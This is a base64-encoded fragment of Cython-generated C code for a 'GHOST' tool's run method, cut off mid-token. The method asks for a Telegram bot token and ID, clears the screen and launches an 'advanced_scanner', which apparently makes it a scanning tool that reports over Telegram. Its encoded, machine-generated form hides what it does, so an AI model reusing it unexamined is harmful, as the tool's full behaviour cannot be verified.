IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDQ1OCwgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDQ1OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgInJ1biIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNDU4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJydW4iLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDQ1OCwgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA0NTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJydW4iLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCA0NTgsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QucnVuIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gTlVMTDtcbiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6O1xuICBfX3B5eF9yID0gX19weXhfcGZfMnR0XzVHSE9TVF8zMHJ1bihfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYpO1xuXG4gIFxuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydHRfNUdIT1NUXzMwcnVuKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYpIHtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzM7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBpbnQgX19weXhfdF84O1xuICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7XG4gIGludCBfX3B5eF90XzEyO1xuICBpbnQgX19weXhfdF8xMztcbiAgY2hhciBjb25zdCAqX19weXhfdF8xNDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE3ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTggPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xOSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIwID0gTlVMTDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicnVuIiwgMCk7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IF9fcHl4X3Zfc2VsZjtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfMyA9IDA7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jcmVhdGVfYmFubmVyLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgxLV9fcHl4X3RfMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDU5LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9DKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDYwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NjAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NjAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Cb3RfVG9rZW4sIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQ2MCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgX19weXhfdF8zID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X3RfNX07XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF9idWlsdGluX2lucHV0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0NjAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIGlmIChfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Rva2VuLCBfX3B5eF90XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDYwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNSA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ2MSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFU0VUKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDYxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDYxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVGVsZWdyYW1fSUQsIF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ2MSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19weXhfdF8zID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfNH07XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF9idWlsdGluX2lucHV0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0NjEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIGlmIChfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJfaWQsIF9fcHl4X3RfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0NjEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF80ID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQ2MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ2MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQ2MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25hbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0NjMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gIF9fcHl4X3RfOCA9IChfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X250LCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOCA8IDApKSkgX19QWVhfRVJSKDAsIDQ2MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICBpZiAoX19weXhfdF84KSB7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbHMpO1xuICAgIF9fcHl4X3RfNSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbHM7XG4gIH0gZWxzZSB7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGVhcik7XG4gICAgX19weXhfdF81ID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyO1xuICB9XG4gIF9fcHl4X3RfMyA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMikpKSB7XG4gICAgX19weXhfdF80ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8yKTtcbiAgICBhc3NlcnQoX19weXhfdF80KTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMik7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzIsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF8zID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3RfNX07XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQ2MywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IF9fcHl4X3Zfc2VsZjtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfMyA9IDA7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGwsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDEtX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0NjUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzksICZfX3B5eF90XzEwLCAmX19weXhfdF8xMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzkpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMiA9IF9fcHl4X3Zfc2VsZjtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpO1xuICAgICAgX19weXhfdF8zID0gMDtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FkdmFuY2VkX3NjYW5uZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDEtX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQ2OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgZ290byBfX3B5eF9MOF90cnlfZW5kO1xuICAgIF9fcHl4X0wzX2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcblxuICAgIFxuICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7XG4gICAgaWYgKF9fcHl4X3RfMTIpIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QucnVuIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDQ2OSwgX19weXhfTDVfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzI7XG4gICAgICAge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzcgPSBOVUxMO1xuICAgICAgICBfX3B5eF90XzMgPSAxO1xuICAgICAgICB7XG4gICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99O1xuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfYnVpbHRpbl9wcmludCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKF9fcHl4X3RfMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDcwLCBfX3B5eF9MMTRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgIHtcbiAgICAgICAge1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDE1O1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0wxNF9lcnJvcjo7XG4gICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICAgIF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE2ID0gMDsgX19weXhfdF8xNyA9IDA7IF9fcHl4X3RfMTggPSAwOyBfX3B5eF90XzE5ID0gMDsgX19weXhfdF8yMCA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblN3YXAoJl9fcHl4X3RfMTgsICZfX3B5eF90XzE5LCAmX19weXhfdF8yMCk7XG4gICAgICAgICAgaWYgKCB1bmxpa2VseShfX1B5eF9HZXRFeGNlcHRpb24oJl9fcH